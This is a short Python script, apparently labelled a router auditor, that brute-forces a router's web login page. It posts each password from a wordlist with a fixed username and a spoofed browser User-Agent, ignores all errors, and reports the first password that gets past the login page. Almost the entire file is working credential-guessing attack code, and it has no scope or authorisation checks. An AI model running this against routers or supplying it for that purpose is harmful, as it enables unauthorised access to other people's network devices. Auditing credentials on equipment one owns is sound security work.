# Router Model Stub
TARGET_PATH = "/login.html"

def run_audit(target_ip, username, wordlist_path):
    import urllib.request
    import urllib.parse
    import os

    print("\n[+] Initializing Native Python Router Auditor (Bypassing Android fdsan)...")
    target_url = f"http://{target_ip}{TARGET_PATH}"
    
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist file '{wordlist_path}' not found.")
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords from {wordlist_path}")
    print(f"[*] Target Endpoint: {target_url}\n")

    for idx, pwd in enumerate(passwords, 1):
        print(f"[Attempt {idx}] Testing password: {pwd}")
        try:
            form_data = urllib.parse.urlencode({'username': username, 'password': pwd}).encode('utf-8')
            req = urllib.request.Request(target_url, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
            
            with urllib.request.urlopen(req, timeout=3) as response:
                html_content = response.read().decode('utf-8', errors='ignore')
                if "login" not in html_content.lower() and response.status == 200:
                    print(f"\n[✔] SUCCESS! Valid credentials found -> Username: {username} | Password: {pwd}\n")
                    return
        except Exception as e:
            pass

    print("\n[-] Audit completed. Try another wordlist or check form parameters.")
